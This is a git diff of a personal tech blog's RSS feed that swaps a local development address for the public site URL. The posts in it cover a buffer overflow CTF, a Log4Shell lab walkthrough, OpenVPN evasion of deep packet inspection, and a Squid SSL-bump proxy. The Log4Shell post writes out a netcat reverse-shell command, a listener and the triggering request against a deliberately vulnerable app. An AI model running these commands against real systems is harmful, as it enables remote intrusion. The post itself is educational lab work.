@@ -2,17 +2,17 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>pacodiazdg.github.io</title>
-    <link>http://10.10.8.69:1313/</link>
+    <link>https://PacodiazDG.github.io/</link>
     <description>Recent content on pacodiazdg.github.io</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Sat, 07 Jun 2025 10:30:00 -0600</lastBuildDate><atom:link href="http://10.10.8.69:1313/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 07 Jun 2025 10:30:00 -0600</lastBuildDate><atom:link href="https://PacodiazDG.github.io/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title> Que es un buffer overflow (vulnserver) (CFT)</title>
-      <link>http://10.10.8.69:1313/posts/que-es-un-buffer-overflow-vulnserver-cft/</link>
+      <link>https://PacodiazDG.github.io/posts/que-es-un-buffer-overflow-vulnserver-cft/</link>
       <pubDate>Sat, 07 Jun 2025 10:30:00 -0600</pubDate>
       
-      <guid>http://10.10.8.69:1313/posts/que-es-un-buffer-overflow-vulnserver-cft/</guid>
+      <guid>https://PacodiazDG.github.io/posts/que-es-un-buffer-overflow-vulnserver-cft/</guid>
       <description>En esta entrada mostrare lo que es un buffer overflow, esta es una falla muy conocida y al mismo tiempo peligrosa en los CFT es común ver este tipo de retos por lo que mostrare como se puede realizar uno básico, para este tipo de vulnerabilidades es necesario tener un poco de conocimiento de cómo se maneja la memoria y asm.
 Los dos programas que se van a ocupar son:</description>
       <content>&lt;p&gt;En esta entrada mostrare lo que es un buffer overflow, esta es una falla muy conocida y al mismo tiempo peligrosa en los CFT es común ver este tipo de retos por lo que mostrare como se puede realizar uno básico, para este tipo de vulnerabilidades es necesario tener un poco de conocimiento de cómo se maneja la memoria y asm.&lt;/p&gt;
@@ -173,10 +173,10 @@ Disassembly=jmp esp&lt;/p&gt;
     
     <item>
       <title>Acerca de log4shell</title>
-      <link>http://10.10.8.69:1313/posts/acerca-de-log4shell/</link>
+      <link>https://PacodiazDG.github.io/posts/acerca-de-log4shell/</link>
       <pubDate>Sat, 07 Jun 2025 10:30:00 -0600</pubDate>
       
-      <guid>http://10.10.8.69:1313/posts/acerca-de-log4shell/</guid>
+      <guid>https://PacodiazDG.github.io/posts/acerca-de-log4shell/</guid>
       <description>log4shell es una falla en Apache Log4j que permite que atacantes puedan ejecutar comandos maliciosos desde servidores LDAP maliciosos, esta vulnerabilidad en sus principios fue un 0 day y debido a que log4j se encuentra en muchas aplicaciones como minecraft, Struts2, Flink entre otros su impacto ha sido muy grande.
 Como Funciona? Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable https://github.com/christophetd/log4shell-vulnerable-app
 git clone https://github.</description>
@@ -185,9 +185,9 @@ git clone https://github.</description>
 &lt;p&gt;Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable &lt;a href=&#34;https://github.com/christophetd/log4shell-vulnerable-app&#34;&gt;https://github.com/christophetd/log4shell-vulnerable-app&lt;/a&gt;&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone https://github.com/christophetd/log4shell-vulnerable-app.git
 docker run --name vulnerable-log4 -p 8081:8080 ghcr.io/christophetd/log4shell-vulnerable-app
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/1d851fb4f2c85bf3e0498b263832fa16012931205a239a371f42cefc5ec6ca576036b9915ebd7849c48426f3c069cdcbb5b54bf2455dc724602eaca20ae1eb6c.png&#34;&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://PacodiazDG.github.io/images/1d851fb4f2c85bf3e0498b263832fa16012931205a239a371f42cefc5ec6ca576036b9915ebd7849c48426f3c069cdcbb5b54bf2455dc724602eaca20ae1eb6c.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;una vez descargado vamos analizar el código para ver en qué forma puede ser vulnerable&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/ace1c5899b23dc855876d6112b119c70a086b6c3696d7c36e5b5fc90300c8635d746d5c23d88c1bf4f2097b42602334d82ed4d42026256a53e82f48f2908e1d0.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://PacodiazDG.github.io/images/ace1c5899b23dc855876d6112b119c70a086b6c3696d7c36e5b5fc90300c8635d746d5c23d88c1bf4f2097b42602334d82ed4d42026256a53e82f48f2908e1d0.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;La parte que nos interesa es:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;@GetMapping&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;)
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; String &lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;@RequestHeader&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-Api-Version&amp;#34;&lt;/span&gt;) String apiVersion) {
@@ -200,7 +200,7 @@ docker run --name vulnerable-log4 -p 8081:8080 ghcr.io/christophetd/log4shell-vu
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;después vamos a necesitar un servidor LDAP que nos permita ejecutar los comandos  &lt;a href=&#34;https://github.com/welk1n/JNDI-Injection-Exploit&#34;&gt;https://github.com/welk1n/JNDI-Injection-Exploit&lt;/a&gt;&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -jar JNDI-Injection-1.0-SNAPSHOT-all.jar -C &amp;#34;nc 172.17.0.1 4444 -e /bin/sh&amp;#34; 
 nc -lvp 4444
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/8b704fcf71dbb7ed35fde12e48b6702579dcea428aba4300bca4b2b8121304bec29426740971334b5fd1d2f67a0556bbd8e2256f623cffd925fceba73caaefed.png&#34;&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://PacodiazDG.github.io/images/8b704fcf71dbb7ed35fde12e48b6702579dcea428aba4300bca4b2b8121304bec29426740971334b5fd1d2f67a0556bbd8e2256f623cffd925fceba73caaefed.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Solo hacemos un http request con el header X-Api-Version y con la dirección que nos proporcionó JNDI Injection&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt; / &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;192.168.1.141:8081&lt;/span&gt;
@@ -210,18 +210,18 @@ nc -lvp 4444
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Encoding&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;gzip, deflate&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connection&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;close&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Upgrade-Insecure-Requests&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/d95ee3cf726654238c8d22e1bd33dc9ef77e30f140abd9200f28397d0bd713247747c1f2aa70d503c237969780ceac41b9e8311108044fc84c960710c28433f4.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/40068b8357a248e64f7103c590e433798614cc565f55a3d07a81a5ef5dbc868bac37cb6cc696f2495e53719253fe2ed82070cfa31e6b09ae7e8ada788d881be5.png&#34;&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://PacodiazDG.github.io/images/d95ee3cf726654238c8d22e1bd33dc9ef77e30f140abd9200f28397d0bd713247747c1f2aa70d503c237969780ceac41b9e8311108044fc84c960710c28433f4.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://PacodiazDG.github.io/images/40068b8357a248e64f7103c590e433798614cc565f55a3d07a81a5ef5dbc868bac37cb6cc696f2495e53719253fe2ed82070cfa31e6b09ae7e8ada788d881be5.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;debido a que la vulnerabilidad ya se encuentra arreglada en las nuevas versiones de Log4j  solo queda actualizar&lt;/p&gt;
 </content>
     </item>
     
     <item>
       <title>Cómo instalar un servidor OpenVPN y evadir los firewalls (DPI)</title>
-      <link>http://10.10.8.69:1313/posts/c%C3%B3mo-instalar-un-servidor-openvpn-y-evadir-los-firewalls-dpi/</link>
+      <link>https://PacodiazDG.github.io/posts/c%C3%B3mo-instalar-un-servidor-openvpn-y-evadir-los-firewalls-dpi/</link>
       <pubDate>Sat, 07 Jun 2025 10:30:00 -0600</pubDate>
       
-      <guid>http://10.10.8.69:1313/posts/c%C3%B3mo-instalar-un-servidor-openvpn-y-evadir-los-firewalls-dpi/</guid>
+      <guid>https://PacodiazDG.github.io/posts/c%C3%B3mo-instalar-un-servidor-openvpn-y-evadir-los-firewalls-dpi/</guid>
       <description>Se mostrará como instalar OpenVPN y como evadir los Firewall que suelen usar Deep Packet Inspection para identificar el tipo de protocolo que son los paquetes, muchos de estos suelen bloquear las conexiones VPN, el funcionamiento se basa en identificar el handshake de OpenVPN entonces si logramos ofuscar el handshake podemos saltarnos esa restricción, por suerte se implemento tls-crypt-v2 lo que reduce significativamente la dificultad.
 Instalacion Lo primero es instalar openvpn y easy-rsa</description>
       <content>&lt;p&gt;Se mostrará como instalar OpenVPN y como evadir los Firewall que suelen usar Deep Packet Inspection para identificar el tipo de protocolo que son los paquetes, muchos de estos suelen bloquear las conexiones VPN, el funcionamiento se basa en identificar el handshake de OpenVPN entonces si logramos ofuscar el handshake podemos saltarnos esa restricción, por suerte se implemento tls-crypt-v2 lo que reduce significativamente la dificultad.&lt;/p&gt;
@@ -361,13 +361,13 @@ Idvc.................
 iptables -t nat -I POSTROUTING  -o ens5 -j MASQUERADE
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;deteccion-por-deep-packet-inspection--dpi&#34;&gt;Deteccion por Deep Packet Inspection  (DPI)&lt;/h2&gt;
 &lt;p&gt;Los firewall usan Deep Packet Inspection para reconocer ciertos protocolos&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/e3938bc2bb3eae0744a63c2b4563ee8362cdda7453ab06b4adb34b890796d6fdcbb31ad740c4acde96dc746179c5eeb695acb3b459c4e633d3d24ac5e6444d90.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://PacodiazDG.github.io/images/e3938bc2bb3eae0744a63c2b4563ee8362cdda7453ab06b4adb34b890796d6fdcbb31ad740c4acde96dc746179c5eeb695acb3b459c4e633d3d24ac5e6444d90.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Desde ver el SNI en el Hello Client, identificar P2P, SSH, QUIC, etc.&lt;/p&gt;
 &lt;p&gt;En este caso se detectó la conexión de openvpn y esto se debe a que el handshake tiene patrones muy reconocibles.&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/8e739d64413c7701beb26d276162ace7bb861ea1bc39eb7f22699e8d8b8270631c537c27f1d86e04b70fedbb7af084254a0a3a9c30a09f0da59d550c0e453b79.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://PacodiazDG.github.io/images/8e739d64413c7701beb26d276162ace7bb861ea1bc39eb7f22699e8d8b8270631c537c27f1d86e04b70fedbb7af084254a0a3a9c30a09f0da59d550c0e453b79.png&#34;&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;Lo primero que tenemos que hacer es cambiar el puerto porque el puerto default es de openvpn.&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/cf7fb424a3f3c78234f4af9bb1db37233d9da8724da4209b1e880faf1eae8285b3040d524144153e0e86cf99238cc24deb956a03c4a5a06a84dbbc756308dfc0.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://PacodiazDG.github.io/images/cf7fb424a3f3c78234f4af9bb1db37233d9da8724da4209b1e880faf1eae8285b3040d524144153e0e86cf99238cc24deb956a03c4a5a06a84dbbc756308dfc0.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;en la configuración usamos tls-crypt-v2 que nos permite ofuscar el handshake de openvpn.&lt;/p&gt;
 &lt;p&gt;podemos ver la documentacion de  tls-crypt-v2&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://github.com/OpenVPN/openvpn/blob/master/doc/tls-crypt-v2.txt&#34;&gt;https://github.com/OpenVPN/openvpn/blob/master/doc/tls-crypt-v2.txt&lt;/a&gt;&lt;/p&gt;
@@ -376,18 +376,18 @@ iptables -t nat -I POSTROUTING  -o ens5 -j MASQUERADE
 &lt;p&gt;&lt;em&gt;A wrapped (encrypted and authenticated) client-specific key can also contain metadata.  The metadata is wrapped together with the key, and can be used to allow servers to identify clients and/or key validity.  This allows the server to abort the connection immediately after receiving the first packet, rather than performing an entire TLS handshake.  Aborting the connection this early greatly improves the DoS resilience and reduces attack surface against malicious clients that have the tls-crypt or tls-auth key.  This is particularly relevant for large deployments (think lost key or disgruntled employee) and VPN providers (clients are not trusted).&lt;/em&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;Una vez que usamos  tls-crypt-v2 ya no es detecatdo por el Deep Packet Inspection
-&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/6a447095ab96f0e0c7ba6014a0f72ccdc12871632c5f09e0ad9d6c2fadf647f5f7f56183a3f0ce5fcf96085e6177f072f9d73787e24e1219882383df5d4f4838.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/cd742e78ab8f75f43e5cc75f28c473ae00eaeb5c5659b83de68f1f6b7ac9573068f5681d2863ef67c0ddc4657703b1635d3aba24b7c6937bd9ce2e7434d2c61c.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/7cd41183b6f6c952ad63be22d0d948c53fdf0a4daa4b5857c1822f669cbbe3a3f129fd03b000a3fc5e0efd203c53b19da3d9a0a9162aad00846fa0f7340cb5f4.png&#34;&gt;&lt;/p&gt;
+&lt;img alt=&#34;Name&#34; src=&#34;https://PacodiazDG.github.io/images/6a447095ab96f0e0c7ba6014a0f72ccdc12871632c5f09e0ad9d6c2fadf647f5f7f56183a3f0ce5fcf96085e6177f072f9d73787e24e1219882383df5d4f4838.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://PacodiazDG.github.io/images/cd742e78ab8f75f43e5cc75f28c473ae00eaeb5c5659b83de68f1f6b7ac9573068f5681d2863ef67c0ddc4657703b1635d3aba24b7c6937bd9ce2e7434d2c61c.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://PacodiazDG.github.io/images/7cd41183b6f6c952ad63be22d0d948c53fdf0a4daa4b5857c1822f669cbbe3a3f129fd03b000a3fc5e0efd203c53b19da3d9a0a9162aad00846fa0f7340cb5f4.png&#34;&gt;&lt;/p&gt;
 </content>
     </item>
     
     <item>
       <title>contador ascendente y descendente  con Display de 7 Segmentos para PIC18F4550 en Ensamblador</title>
-      <link>http://10.10.8.69:1313/posts/contador-ascendente-y-descendente-con-display-de-7-segmentos-para-pic18f4550-en-ensamblador/</link>
+      <link>https://PacodiazDG.github.io/posts/contador-ascendente-y-descendente-con-display-de-7-segmentos-para-pic18f4550-en-ensamblador/</link>
       <pubDate>Sat, 07 Jun 2025 10:30:00 -0600</pubDate>
       
-      <guid>http://10.10.8.69:1313/posts/contador-ascendente-y-descendente-con-display-de-7-segmentos-para-pic18f4550-en-ensamblador/</guid>
+      <guid>https://PacodiazDG.github.io/posts/contador-ascendente-y-descendente-con-display-de-7-segmentos-para-pic18f4550-en-ensamblador/</guid>
       <description>En este proyecto se va a desarrollar un contador ascendente y descendente utilizando el microcontrolador PIC18F4550 en ensamblador. usando un Display de 7 Segmentos para mostrar los valores del contador en orden ascendente y descendente.
 algunos de los pasos se expican en el contador automatico que se encuentra en
 https://devnotescode.com/Pages?id=677437501f54d06c6ecb8012
@@ -799,10 +799,10 @@ LIST P = 18F4550 INCLUDE &amp;lt;P18F4550.INC&amp;gt; ;contador de cambio automa
     
     <item>
       <title>How to Add Images to Your Hugo Posts</title>
-      <link>http://10.10.8.69:1313/posts/how-to-add-images/</link>
+      <link>https://PacodiazDG.github.io/posts/how-to-add-images/</link>
       <pubDate>Sat, 07 Jun 2025 10:30:00 -0600</pubDate>
       
-      <guid>http://10.10.8.69:1313/posts/how-to-add-images/</guid>
+      <guid>https://PacodiazDG.github.io/posts/how-to-add-images/</guid>
       <description>Adding images to your Hugo posts is simple using Markdown.
 Embedding an Image You can embed an image like this:
 ![Alt text for the image](/images/my-awesome-image.jpg)
@@ -820,10 +820,10 @@ Image with a Caption Some themes might support captions. Check your theme&amp;rs
     
     <item>
       <title>Squid proxy 6.0 for Https Filter [Ubuntu 24.04 LTS] [Transparent Proxy]  </title>
-      <link>http://10.10.8.69:1313/posts/squid-proxy-6.0-for-https-filter-ubuntu-24.04-lts-transparent-proxy/</link>
+      <link>https://PacodiazDG.github.io/posts/squid-proxy-6.0-for-https-filter-ubuntu-24.04-lts-transparent-proxy/</link>
       <pubDate>Sat, 07 Jun 2025 10:30:00 -0600</pubDate>
       
-      <guid>http://10.10.8.69:1313/posts/squid-proxy-6.0-for-https-filter-ubuntu-24.04-lts-transparent-proxy/</guid>
+      <guid>https://PacodiazDG.github.io/posts/squid-proxy-6.0-for-https-filter-ubuntu-24.04-lts-transparent-proxy/</guid>
       <description>Squid Proxy is a great tool that allows us to do multiple things; one of them is to function as a forward proxy, and with the use of ACLs, we can filter sites using the SNI.
 installation Squid proxy is installed via apt-get. The squid-openssl version is of interest to us since it contains ssl-bump. If our distribution does not include squid-openssl, it must be installed manually.
 sudo apt-get install squid-openssl We generate the SSL certificates, remember they must be in /etc/squid/ssl; otherwise, Squid will not trust the certificate.</description>
@@ -832,7 +832,7 @@ sudo apt-get install squid-openssl We generate the SSL certificates, remember th
 &lt;h2 id=&#34;installation&#34;&gt;installation&lt;/h2&gt;
 &lt;p&gt;Squid proxy is installed via apt-get. The squid-openssl version is of interest to us since it contains ssl-bump. If our distribution does not include squid-openssl, it must be installed manually.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install squid-openssl
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/9034cefa695d9cf73265449df6f2ba05025a2268660c542a44fb1107d1ef4b2610cde1591a62ded00bde3f9d8d2aa3d307087828e21ae3a8b9cfe05567708983.png&#34;&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://PacodiazDG.github.io/images/9034cefa695d9cf73265449df6f2ba05025a2268660c542a44fb1107d1ef4b2610cde1591a62ded00bde3f9d8d2aa3d307087828e21ae3a8b9cfe05567708983.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;We generate the SSL certificates, remember they must be in /etc/squid/ssl; otherwise, Squid will not trust the certificate.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd /etc/ssl/
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo openssl ecparam -name prime256v1 -genkey -noout -out sslsquid.key
@@ -863,11 +863,11 @@ sudo apt-get install squid-openssl We generate the SSL certificates, remember th
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http_port &lt;span style=&#34;color:#ae81ff&#34;&gt;3131&lt;/span&gt; intercept
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https_port &lt;span style=&#34;color:#ae81ff&#34;&gt;3135&lt;/span&gt; intercept ssl-bump tls-cert&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/etc/ssl/sslsquid.crt tls-key&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/etc/ssl/sslsquid.key generate-host-certificates&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;on dynamic_cert_mem_cache_size&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;16MB
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http_access allow localnet
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/3929c81e35a5719f6884afb94c6b337e6e0ef3f7aeed5fb0221f7343a9518fd80bb5963bf063c1dc565766d63f487d5f496373386e72b2022804c916385328bf.png&#34;&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://PacodiazDG.github.io/images/3929c81e35a5719f6884afb94c6b337e6e0ef3f7aeed5fb0221f7343a9518fd80bb5963bf063c1dc565766d63f487d5f496373386e72b2022804c916385328bf.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Uncomment the following line.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#Default:&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; sslcrtd_program /usr/lib/squid/security_file_certgen -s /var/spool/squid/ssl_db -M 4MB
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/b69d71a0d29f37d5f070dcb09c0093615969d27c1aa02be7abe62e7ff5cb774efb1ff8e50975ffd64ef13f2d8bf8acf9c0f2ff34e40416805def1bcc3e39573f.png&#34;&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://PacodiazDG.github.io/images/b69d71a0d29f37d5f070dcb09c0093615969d27c1aa02be7abe62e7ff5cb774efb1ff8e50975ffd64ef13f2d8bf8acf9c0f2ff34e40416805def1bcc3e39573f.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;We have to configure iptables so that the traffic goes through squid proxy&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo iptables -t nat -I PREROUTING  -p tcp -m tcp --dport &lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt; -j REDIRECT --to-ports &lt;span style=&#34;color:#ae81ff&#34;&gt;3135&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo iptables -t nat -I PREROUTING  -p tcp -m tcp --dport &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; -j REDIRECT --to-ports &lt;span style=&#34;color:#ae81ff&#34;&gt;3131&lt;/span&gt; 
@@ -891,10 +891,10 @@ ssl_bump splice all
 ssl_bump peek all
 ssl_bump splice all&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://wiki.squid-cache.org/Features/SslPeekAndSplice&#34;&gt;https://wiki.squid-cache.org/Features/SslPeekAndSplice&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/8eae27349b3b1381cd930ef923d1d0cea41e9adfd9d4338ace34a7621045d44926cadff03f5a9dfe7edc0143a14f362eb646ba7c50183987d09e8110ab6770ae.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/d7f81f61121521e249fb31d971fe372b7f84421cdb298263324d49d21ab00a9d32e14769101222af4cca06a21b134474a1c9155df279f85da6aab82a2b498b91.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://PacodiazDG.github.io/images/8eae27349b3b1381cd930ef923d1d0cea41e9adfd9d4338ace34a7621045d44926cadff03f5a9dfe7edc0143a14f362eb646ba7c50183987d09e8110ab6770ae.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://PacodiazDG.github.io/images/d7f81f61121521e249fb31d971fe372b7f84421cdb298263324d49d21ab00a9d32e14769101222af4cca06a21b134474a1c9155df279f85da6aab82a2b498b91.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;The website is working without installing any certificate on the client&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/edf1786ab6b3bb51266cf81f277a1e68f584652482d2f83d745e3735ce984744343a21f0516d1081e80c263bac1d44fcb491452a3dd89a1e392607a741022d31.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://PacodiazDG.github.io/images/edf1786ab6b3bb51266cf81f277a1e68f584652482d2f83d745e3735ce984744343a21f0516d1081e80c263bac1d44fcb491452a3dd89a1e392607a741022d31.png&#34;&gt;&lt;/p&gt;
